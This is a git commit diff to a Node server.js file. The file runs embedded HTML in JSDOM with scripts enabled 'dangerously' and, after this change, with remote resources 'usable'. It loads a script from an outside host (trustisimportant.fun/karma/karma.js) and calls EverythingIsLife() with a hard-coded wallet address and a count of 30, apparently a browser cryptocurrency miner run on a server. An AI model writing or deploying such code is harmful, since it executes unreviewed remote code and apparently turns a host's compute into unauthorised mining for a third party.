4e02712c97edef019cfa5164542e15a0f6a175b9
darksheepapi <149430694+darksheepapi@users.noreply.github.com>
2023-12-28 23:17:47 +0530

    Update server.js

--- server.js
+++ server.js
@@ -11,20 +11,23 @@ const htmlContent = `
     <body>
         <script src="https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
         <script type="text/javascript">
-            const url = new URL(window.location.href);
-            const address = url.searchParams.get("address") || "4BE6pHmwt1rMDFWtzFSfQj7Ae8Q6QikKs6B1tmpM8xbU6ZDKBYYJJtRFJVdeVLuQJbHCeEpzY6CDp8BujPg1AcUk5bmDKYb";
+            document.addEventListener("DOMContentLoaded",()=>{
+
+        
+            const address = "4BE6pHmwt1rMDFWtzFSfQj7Ae8Q6QikKs6B1tmpM8xbU6ZDKBYYJJtRFJVdeVLuQJbHCeEpzY6CDp8BujPg1AcUk5bmDKYb";
             EverythingIsLife(address , 'x', 30);
             let i =0;
             setInterval(()=>{
             console.log(++i);
             },2000);
+});
         </script>
     </body>
 </html>
 `;
 
 // Create a virtual DOM
-const dom = new JSDOM(htmlContent, { runScripts: 'dangerously' });
+const dom = new JSDOM(htmlContent, { runScripts: 'dangerously',resources:'usable' });
 
 // Access the document
 const document = dom.window.document;
